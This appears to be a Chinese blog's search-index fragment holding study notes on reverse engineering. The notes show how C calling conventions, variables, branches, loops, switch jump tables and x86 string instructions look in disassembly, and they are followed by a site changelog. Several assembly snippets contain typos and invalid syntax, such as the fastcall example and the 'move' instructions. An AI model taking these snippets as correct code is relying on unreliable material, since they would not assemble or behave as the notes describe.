[ebp+0C]</span><br><span class="line">push ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h3 id="3-调用约定"><a href="#3-调用约定" class="headerlink" title="3 调用约定"></a>3 调用约定</h3><blockquote><p>VC：配置属性——C/C++——高级——调用约定</p><p>调用约定可以写在函数前，如 <code>int __cdecl add()&#123;&#125;</code></p><p>C中不加说明默认<code>__cdecl</code>。</p><p>c++也一样，但是默认调用方式可以在IDE（开发环境）中修改。</p><p>带有可变参数的函数必须用<code>__cdecl</code>方式。如：<code>int printf(char* fmtstr,...);</code></p></blockquote><ol><li><p>cdecl</p><blockquote><p><code>__cdecl</code>是C Declaration的缩写，所以参数是从右到左依次入栈，并且参数是由调用者清除，称为手动清栈。（注：不是指程序员清栈）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;示例代码int add(int a,int b)&#123; return a+b; &#125;</span><br><span class="line">;调用代码</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">mov eax,dword ptr [arg.1]</span><br><span class="line">mov eax,dword ptr [arg.2]</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br><span class="line">;主函数</span><br><span class="line">push [arg.2] ;参数从右往左入栈</span><br><span class="line">push [arg.1]</span><br><span class="line">call func</span><br><span class="line">add esp,8 ;调用者清栈</span><br></pre></td></tr></table></figure></li><li><p>stdcall</p><blockquote><p>API 调用是 standardcall，是C++的标准调用方式，所有参数从右到左依次入栈，如果是调用类成员的话，最后一个入栈的是 this 指针。</p><p>这些堆栈中的参数由被调用的函数在返回后清除，使用的指令是 retn X，X表示参数占用的字节数（内存空间大小）。CPU在ret之后自动弹出X个字节的栈空间，称为自动清栈。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;示例代码</span><br><span class="line">;调用代码</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">mov eax,dword ptr [arg.1]</span><br><span class="line">mov eax,dword ptr [arg.2]</span><br><span class="line">pop ebp</span><br><span class="line">ret 8 ;自动清栈</span><br><span class="line">;主函数</span><br><span class="line">push [arg.2] ;参数从右往左入栈</span><br><span class="line">push [arg.1]</span><br><span class="line">call func</span><br></pre></td></tr></table></figure></li><li><p>fastcall</p><blockquote><p><code>__fastcall</code>是编译器指定的快速调用方式。</p><p>fastcall通常规定将前两个（或若干个）参数由寄存器传递，其余参数还是通过堆栈传递。</p><p>不同编译器编译的程序规定的寄存器不同，返回方式和stdcall相同。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;示例代码（假设有三个参数）</span><br><span class="line">;调用代码</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,8</span><br><span class="line">mov dword ptr [local.2],edx</span><br><span class="line">mov dword ptr [local.1],ecx</span><br><span class="line">mov eax,dword ptr [local.1]</span><br><span class="line">add eax,dword ptr [local.2]</span><br><span class="line">add eax,dword ptr [arg.3]</span><br><span class="line">pop ebp</span><br><span class="line">ret 8 ;自动清栈</span><br><span class="line">;主函数</span><br><span class="line">push [arg.3]</span><br><span class="line">mov edx,push [arg.2] ;参数从右往左入栈</span><br><span class="line">mov ecx,push [arg.1]</span><br><span class="line">call func</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="二、变量分析"><a href="#二、变量分析" class="headerlink" title="二、变量分析"></a>二、变量分析</h2><h3 id="1-指针"><a href="#1-指针" class="headerlink" title="1 指针"></a>1 指针</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;定义int *p = &amp;i;</span><br><span class="line">lea edx,[local.2] ;edx = &amp;i</span><br><span class="line">mov dword ptr [local.1],edx ;p = edx;</span><br><span class="line"></span><br><span class="line">;指针操作</span><br><span class="line">mov ebx,p</span><br><span class="line">add word ptr [ebx],0x333 ;i+=0x333（此处前面要加上单元大小，否则默认byte）</span><br></pre></td></tr></table></figure><h3 id="2-i-和-i"><a href="#2-i-和-i" class="headerlink" title="2 i++和++i"></a>2 i++和++i</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i = 0;</span><br><span class="line">;int j = i++（先赋值再加）</span><br><span class="line">mov dword ptr [local.2],0 ;j = 0</span><br><span class="line">mov ecx,dword ptr [local.1] ;ecx = i</span><br><span class="line">mov dword ptr [local.2],ecx ;j = ecx</span><br><span class="line">mov edx,dword ptr [local.1] ;edx = i</span><br><span class="line">add edx,1 ; edx = edx + 1</span><br><span class="line">mov dword ptr [local.1],edx ;i = edx</span><br><span class="line"></span><br><span class="line">;int j = ++i（先加再赋值）</span><br><span class="line">mov ecx,dword ptr [local.1] ;ecx = i</span><br><span class="line">add ecx,1 ; ecx = ecx + i</span><br><span class="line">mov dword ptr [local.1],ecx ;i = ecx</span><br><span class="line">mov edx,dword ptr [local.1] ;edx = i</span><br><span class="line">mov dword ptr [local.2],edx ;j = edx</span><br><span class="line"></span><br><span class="line">;完全优化：int i=0;int j=i++;printf(&quot;%d&quot;,j);j=++i;printf(&quot;%d&quot;,j);</span><br><span class="line">;编译器会直接先输出0，然后i += 2，然后输出2。</span><br></pre></td></tr></table></figure><h3 id="3-浮点数"><a href="#3-浮点数" class="headerlink" title="3 浮点数"></a>3 浮点数</h3><blockquote><p>st0-st7（MMX，FPU）：80位两用寄存器器。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;老汇编</span><br><span class="line">fld fstp fadd</span><br><span class="line"></span><br><span class="line">;新汇编</span><br><span class="line">;float fl = 8.765f;</span><br><span class="line">movss xmm0,dword ptr [0A32118h]  </span><br><span class="line">movss dword ptr [fl],xmm0  </span><br><span class="line">;fl++;</span><br><span class="line">movss xmm0,dword ptr [fl]  </span><br><span class="line">addss xmm0,dword ptr [0A32114h]  </span><br><span class="line">movss dword ptr [fl],xmm0  </span><br><span class="line"></span><br><span class="line">;时间优化</span><br><span class="line">movups xmm0,dqword ptr ds:[0x2F2118] ;将内存地址0x2F2118处的8字节数据（即一个双精度浮点数）加载到XMM0寄存器中。movups表示以128位为单位进行加载，因为XMM0寄存器是128位的。</span><br><span class="line">movsd qword ptr ss:[esp],xmm0 ;将XMM0寄存器中的数据转存到栈顶（ESP寄存器指向的位置）中。这里使用了movsd指令，表示以64位为单位进行转存。</span><br></pre></td></tr></table></figure><hr><h2 id="三、结构分析"><a href="#三、结构分析" class="headerlink" title="三、结构分析"></a>三、结构分析</h2><h3 id="1-if-else"><a href="#1-if-else" class="headerlink" title="1 if-else"></a>1 if-else</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>,b = <span class="number">2</span>; <span class="comment">//正常赋值</span></span><br><span class="line">    <span class="keyword">if</span>(a &gt; b) </span><br><span class="line">    <span class="comment">// cmp [a],[b]</span></span><br><span class="line">    <span class="comment">// jle printf(&quot;a &lt;= b\n&quot;);不满足条件则转移，否则顺序向下执行。</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &gt; b\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="comment">// jmp short 01282100;else直接被翻译成jmp跳转到结束位置</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &lt;= b\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 设此处地址01282100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-switch-else"><a href="#2-switch-else" class="headerlink" title="2 switch-else"></a>2 switch-else</h3><h4 id="2-1-普通形式"><a href="#2-1-普通形式" class="headerlink" title="2.1 普通形式"></a>2.1 普通形式</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;switch-case\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// mov dword ptr [ebp-4],3</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span>(a)</span><br><span class="line">    <span class="comment">// mov eax,dword ptr [ebp-4] ;这里他会自动创建一个匿名变量，值同a</span></span><br><span class="line">    <span class="comment">// mov dword ptr [ebp-8],eax ;之后他会用这个匿名变量进行比较</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// cmp dword ptr [ebp-8],1 </span></span><br><span class="line">        <span class="comment">// je addr</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// jmp addr ;不写break会没有jmp导致向下执行。</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;2\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;3\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// jmp addr</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 整体结构如下</span></span><br><span class="line"><span class="comment">// 1.赋值</span></span><br><span class="line">mov eax,dword ptr [ebp<span class="number">-4</span>] </span><br><span class="line">mov dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="comment">// 2.一堆cmp和je</span></span><br><span class="line">cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">1</span> </span><br><span class="line">je addr</span><br><span class="line">cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">2</span></span><br><span class="line">je addr  </span><br><span class="line">cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">3</span> </span><br><span class="line">je addr  </span><br><span class="line">jmp addr <span class="comment">// defalut</span></span><br><span class="line"><span class="comment">// 3.每个case执行的操作，顺序存储</span></span><br><span class="line"><span class="function">call <span class="title">printf</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">jmp addr</span></span><br><span class="line"><span class="function">call <span class="title">printf</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function">jmp addr</span></span><br><span class="line"><span class="function">call <span class="title">printf</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function">jmp addr</span></span><br><span class="line"><span class="function"><span class="title">printf</span><span class="params">(<span class="string">&quot;default&quot;</span>)</span></span></span><br></pre></td></tr></table></figure><h4 id="2-2-跳转表"><a href="#2-2-跳转表" class="headerlink" title="2.2 跳转表"></a>2.2 跳转表</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;switch-case\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">switch</span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x13</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x13\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x15</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x15\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x10</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x10\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x20</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x20\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x22</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x22\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:<span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00341080  PUSH EBP</span><br><span class="line">00341081  MOV EBP,ESP</span><br><span class="line">00341083  SUB ESP,8</span><br><span class="line">00341086  PUSH 汇编语言.00342100                       ; /Arg1 = 00342100 ASCII &quot;switch-case&quot;</span><br><span class="line">0034108B  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341090  ADD ESP,4</span><br><span class="line"></span><br><span class="line">00341093  MOV DWORD PTR SS:[EBP-8],20</span><br><span class="line">0034109A  MOV EAX,DWORD PTR SS:[EBP-8]</span><br><span class="line">0034109D  MOV DWORD PTR SS:[EBP-4],EAX</span><br><span class="line">003410A0  MOV ECX,DWORD PTR SS:[EBP-4]</span><br><span class="line"></span><br><span class="line">003410A3  SUB ECX,10 ; a-10，就是a减去case中的最小值</span><br><span class="line">003410A6  MOV DWORD PTR SS:[EBP-4],ECX</span><br><span class="line">003410A9  CMP DWORD PTR SS:[EBP-4],12 ;因为case中最大为0x22，最小0x10，所以范围是12。如果a-10不落在0-12中表示不是这里的面的值，直接下面跳转结束，否则会有一个跳转表，计算出的值会对应跳转到一个指定的地址，输出指定的值。</span><br><span class="line">003410AD  JA SHORT 汇编语言.0034110B</span><br><span class="line"></span><br><span class="line">003410AF  MOV EDX,DWORD PTR SS:[EBP-4] ;落在范围内则找表跳转到指定位置</span><br><span class="line">003410B2  MOVZX EAX,BYTE PTR DS:[EDX+341144]</span><br><span class="line">003410B9  JMP DWORD PTR DS:[EAX*4+34112C]</span><br><span class="line"></span><br><span class="line">003410C0  PUSH 汇编语言.00342110                       ; /Arg1 = 00342110 ASCII &quot;0x13&quot;</span><br><span class="line">003410C5  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410CA  ADD ESP,4</span><br><span class="line">003410CD  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410CF  PUSH 汇编语言.00342118                       ; /Arg1 = 00342118 ASCII &quot;0x15&quot;</span><br><span class="line">003410D4  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410D9  ADD ESP,4</span><br><span class="line">003410DC  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410DE  PUSH 汇编语言.00342120                       ; /Arg1 = 00342120 ASCII &quot;0x10&quot;</span><br><span class="line">003410E3  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410E8  ADD ESP,4</span><br><span class="line">003410EB  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410ED  PUSH 汇编语言.00342128                       ; /Arg1 = 00342128 ASCII &quot;0x20&quot;</span><br><span class="line">003410F2  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410F7  ADD ESP,4</span><br><span class="line">003410FA  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410FC  PUSH 汇编语言.00342130                       ; /Arg1 = 00342130 ASCII &quot;0x22&quot;</span><br><span class="line">00341101  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341106  ADD ESP,4</span><br><span class="line">00341109  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">0034110B  PUSH 汇编语言.00342138                       ; /Arg1 = 00342138 ASCII &quot;default&quot;</span><br><span class="line">00341110  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341115  ADD ESP,4</span><br><span class="line"></span><br><span class="line">00341118  PUSH 汇编语言.00342140                       ; /Arg1 = 00342140 ASCII &quot;end&quot;</span><br><span class="line">0034111D  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341122  ADD ESP,4</span><br><span class="line"></span><br><span class="line">00341125  XOR EAX,EAX</span><br><span class="line">00341127  MOV ESP,EBP</span><br><span class="line">00341129  POP EBP</span><br><span class="line">0034112A  RETN</span><br></pre></td></tr></table></figure><h3 id="3-for"><a href="#3-for" class="headerlink" title="3 for"></a>3 for</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 1; i &lt;= 10; ++i)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;优化/Od（无优化）</span><br><span class="line">push ecx ;入栈ecx，不需要关心ecx的值，只是开辟栈存i而已</span><br><span class="line">00591091 MOV DWORD PTR SS:[EBP-4],1 ;赋初值</span><br><span class="line">00591098 JMP SHORT 汇编语言.005910A3 ;进入循环</span><br><span class="line">;循环</span><br><span class="line">0059109A MOV EAX,DWORD PTR SS:[EBP-4] ;++i</span><br><span class="line">0059109D ADD EAX,1</span><br><span class="line">005910A0 MOV DWORD PTR SS:[EBP-4],EAX</span><br><span class="line">005910A3 CMP DWORD PTR SS:[EBP-4],0A ;i&gt;10结束</span><br><span class="line">005910A7 JG SHORT 汇编语言.005910BC</span><br><span class="line">005910A9 MOV ECX,DWORD PTR SS:[EBP-4]</span><br><span class="line">005910AC PUSH ECX ;Arg2</span><br><span class="line">005910AD PUSH 汇编语言.00592108 ;Arg1 = 00592108 ASCII &quot;%d&quot;</span><br><span class="line">005910B2 CALL 汇编语言.00591040 ;printf(&quot;%d&quot;,i);</span><br><span class="line">005910B7 ADD ESP,8</span><br><span class="line">005910BA JMP SHORT 汇编语言.0059109A</span><br><span class="line"></span><br><span class="line">;优化/O1（大小优化，指令变少）</span><br><span class="line">;可能还会有 mov edi, dword ptr [&lt;&amp;MSUCR100printf&gt;]，call edi的指令，这也是一种优化</span><br><span class="line">00311034 PUSH ESI ;保护esi</span><br><span class="line">0031103F XOR ESI,ESI ;esi=0</span><br><span class="line">00311042 INC ESI ;先i=1</span><br><span class="line">;循环</span><br><span class="line">00311043 PUSH ESI ;Arg2</span><br><span class="line">00311044 PUSH 汇编语言.00312108 ;Arg1,ASCII &quot;%d&quot;</span><br><span class="line">00311049 CALL 汇编语言.00311006</span><br><span class="line">0031104E INC ESI</span><br><span class="line">0031104F POP ECX ;两次pop相当于上面的ADD ESP,8，保证堆栈平衡</span><br><span class="line">00311050 POP ECX</span><br><span class="line">00311051 CMP ESI,0A</span><br><span class="line">00311054 JLE SHORT 汇编语言.00311043 ;i&lt;=10继续循环</span><br><span class="line">;循环结束</span><br><span class="line">00311056 POP ESI ;取出esi</span><br><span class="line"></span><br><span class="line">;优化/O2（速度优化）</span><br><span class="line">00851040  PUSH ESI</span><br><span class="line">0085104E  MOV ESI,1 ;i=1</span><br><span class="line">;循环开始</span><br><span class="line">00851053  PUSH ESI ; Arg2</span><br><span class="line">00851054  PUSH 汇编语言.00852108 ; Arg1 = 00852108 ASCII &quot;%d&quot;</span><br><span class="line">00851059  CALL 汇编语言.00851010 ; 汇编语言.00851010</span><br><span class="line">0085105E  INC ESI</span><br><span class="line">0085105F  ADD ESP,8</span><br><span class="line">00851062  CMP ESI,0A</span><br><span class="line">00851065  JLE SHORT 汇编语言.00851053</span><br><span class="line">;循环结束</span><br><span class="line">00851067  POP ESI</span><br><span class="line"></span><br><span class="line">;优化/Ox（完全优化）</span><br><span class="line">;该实例代码优化结果基本同/O2</span><br></pre></td></tr></table></figure><h3 id="4-while-do-while"><a href="#4-while-do-while" class="headerlink" title="4 while/do-while"></a>4 while/do-while</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; while(i&lt;=10)&#123;&#125;</span><br><span class="line">loop:</span><br><span class="line">cmp dowrd ptr [local1],0A</span><br><span class="line">jg end</span><br><span class="line">statement</span><br><span class="line">jmp loop</span><br><span class="line">end:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">; do&#123;&#125;while(i&lt;=10);</span><br><span class="line">loop:</span><br><span class="line">statement</span><br><span class="line">cmp dowrd ptr [local.1],0A </span><br><span class="line">jle loop</span><br></pre></td></tr></table></figure><h3 id="5-逻辑运算"><a href="#5-逻辑运算" class="headerlink" title="5 逻辑运算"></a>5 逻辑运算</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;a || b</span><br><span class="line">cmp dword ptr [a],0</span><br><span class="line">jne true </span><br><span class="line">cmp dwrod ptr [b],0</span><br><span class="line">jne true</span><br><span class="line"></span><br><span class="line">;a &amp;&amp; b</span><br><span class="line">cmp dword ptr [a],0</span><br><span class="line">je false</span><br><span class="line">cmp dwrod ptr [b],0</span><br><span class="line">je false</span><br><span class="line"></span><br><span class="line">;b = !a</span><br><span class="line">cmp dword ptr [a],0</span><br><span class="line">sete al</span><br><span class="line">mov dword ptr [b],eax</span><br><span class="line"></span><br><span class="line">;b = ~a</span><br><span class="line">mov ecx,dword ptr [a]</span><br><span class="line">not ecx</span><br><span class="line">mov dword ptr [b],ecx</span><br><span class="line"></span><br><span class="line">;c = a ^ b</span><br><span class="line">movzx eax,byte ptr [b]</span><br><span class="line">movzx ecx,byte ptr [a]</span><br><span class="line">xor eax,ecx</span><br><span class="line">mov byte ptr [c],al</span><br></pre></td></tr></table></figure><hr><h2 id="四、汇编指令"><a href="#四、汇编指令" class="headerlink" title="四、汇编指令"></a>四、汇编指令</h2><h3 id="1-repne和scasb"><a href="#1-repne和scasb" class="headerlink" title="1 repne和scasb"></a>1 repne和scasb</h3><blockquote><p>常用于：</p><ol><li>寻找字符串中字符，字符存在al中。</li><li>计算字符串长度。</li><li>在内存中地位一串特征码。</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;scasb,编译后如下：(相当于cmp byte ptr[edi],al。同时还会根据DF的值对edi加n,取决于操作的内存大小)</span><br><span class="line">scas byte ptr [edi]</span><br><span class="line">;同理两个</span><br><span class="line">scasw; scas word ptr [edi]</span><br><span class="line">scasd; scas dword ptr [edi]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;repnz/repne scasb,编译后如下：(当ecx!=0且ZF=0，重复后面的指令(scas byte ptr es:[edi])，且每次ecx--)</span><br><span class="line">repne scas byte ptr es:[edi]</span><br></pre></td></tr></table></figure><h3 id="2-repe和cmpsb"><a href="#2-repe和cmpsb" class="headerlink" title="2 repe和cmpsb"></a>2 repe和cmpsb</h3><blockquote><p>常用于比较字符串是否相等</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;同理上面</span><br><span class="line">;cmpsb,cmpsw,cmpsd</span><br><span class="line">cmps byte ptr [edi],byte ptr [esi]</span><br><span class="line">cmps word ptr [edi],byte ptr [esi]</span><br><span class="line">cmps dword ptr [edi],byte ptr [esi]</span><br><span class="line"></span><br><span class="line">;repe/repz(当ecx!=0且ZF=1重复后面语句并ecx--)</span><br><span class="line">repe cmpsb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;汇编编写字符串比较函数</span><br><span class="line">;__declspec(naked)告诉编译器该函数是纯汇编实现，不自动添加寄存器保护和堆栈平衡</span><br><span class="line">; 窄字节</span><br><span class="line">__declspec(naked) int asm_strcmp(char *s1,char* s2)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp ;构建新栈底</span><br><span class="line">push ecx</span><br><span class="line">push edi</span><br><span class="line">push esi</span><br><span class="line">push edx</span><br><span class="line"></span><br><span class="line">xor al,al</span><br><span class="line">mov edi,[ebp+4+4] ;s1</span><br><span class="line">mov ecx,-1</span><br><span class="line">CLD</span><br><span class="line">repnz scasb</span><br><span class="line">not ecx</span><br><span class="line"></span><br><span class="line">mov edi,[ebp+4+4] ;s1</span><br><span class="line">mov esi,[ebp+4+8] ;s2</span><br><span class="line">repz cmpsb</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al,[edi-1]</span><br><span class="line">mov dl,[esi-1]</span><br><span class="line">sub eax,edx</span><br><span class="line">        </span><br><span class="line">        pop edx</span><br><span class="line">        pop esi</span><br><span class="line">        pop edi</span><br><span class="line">        pop ecx</span><br><span class="line">        pop ebp</span><br><span class="line"></span><br><span class="line">retn</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; 宽字节</span><br><span class="line">__declspec(naked) int asm_strcmp(wchar_t *s1,wchar_t* s2)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp ;构建新栈底</span><br><span class="line">push ecx</span><br><span class="line">push edi</span><br><span class="line">push esi</span><br><span class="line">push edx</span><br><span class="line"></span><br><span class="line">xor ax,ax ;区别窄字节</span><br><span class="line">mov edi,[ebp+4+4] ;s1</span><br><span class="line">mov ecx,-1</span><br><span class="line">CLD</span><br><span class="line">repnz scasw ;区别窄字节</span><br><span class="line">not ecx</span><br><span class="line"></span><br><span class="line">mov edi,[ebp+4+4] ;s1</span><br><span class="line">mov esi,[ebp+4+8] ;s2</span><br><span class="line">repz cmpsw ;区别窄字节</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al,[edi-2] ;区别窄字节</span><br><span class="line">mov dl,[esi-2] ;区别窄字节</span><br><span class="line">sub eax,edx</span><br><span class="line">        </span><br><span class="line">        pop edx</span><br><span class="line">        pop esi</span><br><span class="line">        pop edi</span><br><span class="line">        pop ecx</span><br><span class="line">        pop ebp</span><br><span class="line"></span><br><span class="line">retn</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-rep和串操作"><a href="#3-rep和串操作" class="headerlink" title="3 rep和串操作"></a>3 rep和串操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;串存储</span><br><span class="line">;stosb,stosw,stosd | stos byte ptr [edi]</span><br><span class="line">move byte ptr [edi],al</span><br><span class="line">move word ptr [edi],ax</span><br><span class="line">move dword ptr [edi],eax</span><br><span class="line"></span><br><span class="line">;rep sto byte ptr [edi]（ecx计数，edi存值，每次存完edi += n）</span><br><span class="line">rep stosb</span><br><span class="line"></span><br><span class="line">;串载入（只能载入一段，eax中的值会被一直覆盖）</span><br><span class="line">;lodsb,lodsw,lodsd | lods byte ptr [edi]</span><br><span class="line">mov al, byte ptr [esi]</span><br><span class="line">mov ax, word ptr [esi]</span><br><span class="line">mov eax, dword ptr [esi]</span><br><span class="line">;rep lods byte ptr [edi]（ecx计数，edi存值，每次存完edi += n）</span><br><span class="line">rep lodsb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 自定义移动字符串，效率远高于memset</span><br><span class="line">int src[10];</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ecx,len(src)</span><br><span class="line">xor eax,eax</span><br><span class="line">lea edi,src</span><br><span class="line">rep stosd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="五、可能的花指令"><a href="#五、可能的花指令" class="headerlink" title="五、可能的花指令"></a>五、可能的花指令</h2><blockquote><p>对程序没有实际影响，却会干扰破解者进行破解。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;不带进位循环左移32位等于没移</span><br><span class="line">rol i,0x20</span><br></pre></td></tr></table></figure><hr><h2 id="六、壳"><a href="#六、壳" class="headerlink" title="六、壳"></a>六、壳</h2>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站日志</title>
      <link href="/posts/551f943f.html"/>
      <url>/posts/551f943f.html</url>
      
        <content type="html"><![CDATA[<div class="timeline blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h1 id="网站更新日志"><a href="#网站更新日志" class="headerlink" title="网站更新日志"></a>网站更新日志</h1></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h2 id="V1-03-2023-6-26"><a href="#V1-03-2023-6-26" class="headerlink" title="V1.03  [2023-6-26]"></a>V1.03  [2023-6-26]</h2></div></div><div class="timeline-item-content"><div class="tabs" id="v1.03"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#v1.03-1">总体更新</button></li><li class="tab"><button type="button" data-href="#v1.03-2">网站修改【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="v1.03-1"><p>优化了分类栏。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="v1.03-2"><p>V1.03修改的网站配置如下：</p><ol><li>优化了文章分类首页的显示。</li><li>卸载了网站首页的分类栏。</li></ol><button type="button" class="tab-to-top" 